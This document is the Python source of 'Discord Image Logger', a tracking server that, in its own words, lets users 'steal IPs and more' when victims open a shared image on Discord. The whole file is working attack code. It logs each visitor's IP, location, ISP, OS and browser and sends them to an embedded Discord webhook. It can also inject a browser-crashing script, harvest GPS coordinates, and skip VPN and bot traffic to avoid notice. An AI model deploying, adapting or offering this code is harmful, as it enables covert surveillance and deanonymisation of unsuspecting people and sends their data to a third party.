# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1497240720380268584/ld10UDPd_3bVr21iJXAj9J9o94gQmFeR1sbi6-MM6EZeDmZeNkl2EQMTqW75GYpFo0yk",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
